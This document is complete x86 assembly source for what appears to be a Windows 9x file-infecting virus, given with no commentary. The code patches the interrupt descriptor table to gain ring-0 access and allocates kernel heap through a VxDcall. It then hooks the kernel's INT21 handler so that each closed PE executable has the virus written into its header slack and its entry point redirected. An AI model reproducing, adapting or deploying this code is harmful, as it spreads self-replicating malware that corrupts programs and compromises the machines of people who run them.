   kernel_ord0             equ     0BFF713D4h
   kernel_int21            equ     0BFF712B9h

                           p386
                           model   flat

                           .data

                           dd      ?

                           .code
   start:

                           push    edi                     ; EDI <-- LDT.base
                           sidt    [esp-2]
                           pop     edi

                           fild    qword ptr [edi]         ; save desriptor #0

                           call    getr0procaddr          ; to get offset r0proc

   r0proc:                 fistp   qword ptr [edi-8]       ; restore descr. #0
                           ;;
                           mov     ebx, kernel_int21+8

   kernel_c1               equ     (kernel_ord0-(kernel_int21+8+4)) and 255
                           cmp     byte ptr [ebx], kernel_c1 ; alredy?
                           jne     r0exit

                           fild    qword ptr [vc1-start+esi];save VxDcall's code

                           push    virtsize                ; size of memory
   vc1:                    db      0CDh,20h                ; VxDcall
                           dd      0040000Dh               ; IFSMGR_GetHeap
                           pop     ecx                     ; ECX=virtsize

                           fistp   qword ptr [vc1-start+esi];rest.VxDcall's code

                           xchg    edi, eax                ; EDI = new location
                           rep     movsb                   ; copy virus

                           sub     edi, virtend-hook+4     ; EDI=(offset hook)-4
                           sub     edi, ebx                ;
                           mov     [ebx], edi             ; set new addr to call
                           ;;
   r0exit:                 iret                            ; back to ring3

   getr0procaddr:          pop     eax                     ; EAX = offset r0proc
                           stosd                           ; +0 WORD offs&0xFFFF
                           stosd                           ; +6 WORD offs>>16
                           mov     [edi-8+2], 0EE000028h   ; +2 DWORD sel./flags

                           xchg    esi, eax                ; ESI = offset r0proc
                           sub     esi, r0proc-start       ; ESI = offset start

                           int     00h                     ; call ring-0

                           db      0E9h                    ; return to host
   oldeip                  dd      rt-$-4                 ; 1stime points to ret

   hook:                   push    kernel_ord0             ; return address

                           cmp     ah, 3Eh
                           jne     hookexit                ;

   infect:                 pusha                           ; save regs

                           mov     ebp, kernel_int21       ; EBP = kernel_int21

                           xor     eax, eax                ; seek begin
                           mov     ah, 42h
                           cdq
                           xor     ecx, ecx
                           call    ebp

                           mov     esi, [ebp+8]
                           lea     esi, [esi+ebp-(hook-start-8-4)] ; ESI=offset start

                           mov     ch, bufsize/256         ; ECX = bufsize

                           lea     edx, [esi+ecx]          ; EDI=EDX=offset buf

                           mov     ah, 3Fh                 ; read buffer
                           call    ebp                     ; call ebp/ret

                           pusha                           ; seek begin
                           mov     ah, 42h                 ; we hope al=0
                           xor     edx, edx
                           xor     ecx, ecx
                           call    ebp
                           popa

                           mov     ecx, [edx+3Ch]          ; ECX = mz.pe_ptr
                           cmp     ecx, eax                ; EAX = numread
                           jae     infect_exit

                           lea     edi, [edx+ecx]          ; EDI=pe hdr offset

                           cmp     byte ptr [edi], 'Z'     ; 'P'
                           jne     infect_exit

                           add     ecx, [edi+54h]          ; pe_headersize
                           lea     eax, [edx+ecx]          ; EAX = new loc ofs
                           xchg    ecx, [edi+28h]       ; ECX <--> entrypointrva
                           sub     ecx, [edi+28h]
                           sub     ecx, oldeip+4-start
                           mov     oldeip-start[esi], ecx ; store old entrypoint

                           xor     ecx, ecx                ; ECX = physsize
                           mov     cl, physsize
                           add     [edi+54h], ecx    ; pe_headersize += our.size

                           xchg    edi, eax        ; EDI = our location (in buf)

                           xor     eax, eax             ; check our new location
                           pusha                           ; should be zeroes
                           repz    scasb
                           popa
                           jne     infect_exit

                           rep     movsb                   ; copy virus to buf

                           mov     ah, 40h                 ; write virus
                           mov     ch, bufsize/256         ; ECX = bufsize
                           call    ebp                     ; int21

   infect_exit:            popa                            ; restore regs

   rt:
   hookexit:               ret                             ; return to krnl_ord0

   physend:
   physsize                equ     $-start

                           org     start+bufsize          ; offset buf==size buf
   bufsize                 equ     4096
   buf                     db      bufsize dup (0)

   virtend:
   virtsize                equ     $-start

                           db      13,10
                           db      '------------------------',13,10

                           db      'physsize = '
                           db      physsize/1000 mod 10+'0'
                           db      physsize/ 100 mod 10+'0'
                           db      physsize/  10 mod 10+'0'
                           db      physsize/   1 mod 10+'0'
                           db      ' bytes',13,10
                           db      'virtsize = '
                           db      virtsize/1000 mod 10+'0'
                           db      virtsize/ 100 mod 10+'0'
                           db      virtsize/  10 mod 10+'0'
                           db      virtsize/   1 mod 10+'0'
                           db      ' bytes',13,10

                           db      '------------------------',13,10
                           db      13,10

                           end     start
